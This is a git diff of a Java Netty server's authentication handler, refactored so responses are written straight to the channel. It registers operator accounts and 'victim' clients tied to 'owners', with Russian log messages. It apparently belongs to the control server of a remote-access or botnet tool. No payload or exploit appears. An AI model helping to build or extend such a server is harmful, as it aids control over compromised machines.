@@ -273,7 +273,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
         return true;
     }
 
-    private JSONObject checkAuth(ChannelHandlerContext ctx, JSONObject request) {
+    private void checkAuth(ChannelHandlerContext ctx, JSONObject request) {
         String action = (String) request.get("action");
         JSONObject response = new JSONObject();
         response.put("action", action);
@@ -282,33 +282,36 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
             String password = (String) request.get("password");
             if (login == null || password == null) {
                 response.put("errorCode", Config.INCORRECT_QUERY);
-                return response;
+                ctx.writeAndFlush(response);
+                return;
             }
             ArrayList<JSONObject> usersData = NettyServer.getDBManager().users.get(login, password);
             if (usersData.size() == 0) {
                 response.put("errorCode", Config.INVALID_AUTH);
-                return response;
+                ctx.writeAndFlush(response);
+                return;
             }
             User newUser = new User(ctx, usersData.get(0));
             nettyServer.getUsers().put(ctx.channel().id(), newUser);
             System.out.println("Пользователь " + newUser.getLogin() + " авторизовался!");
-            response.put("token", newUser.getToken());
+            newUser.sendAuthUser(newUser.getToken());
         } else if (action.equals("auth.victim")) {
             String name = (String) request.get("name");
             ArrayList<String> owners = (ArrayList<String>) request.get("owners");
             if (name == null || owners == null) {
                 response.put("errorCode", Config.INCORRECT_QUERY);
-                return response;
+                ctx.writeAndFlush(response);
+                return;
             }
             Victim newVictim = new Victim(ctx, name, owners);
             nettyServer.getVictims().put(ctx.channel().id(), newVictim);
             System.out.println("Жертва " + newVictim.getName() + " авторизовалась!");
+            newVictim.sendAuthVictim();
         } else {
-            ctx.close();
             response.put("errorCode", Config.INCORRECT_QUERY);
+            ctx.writeAndFlush(response);
+            ctx.close();
             System.out.println("Неопознанный клиент был кикнут!");
         }
-
-        return response;
     }
 }
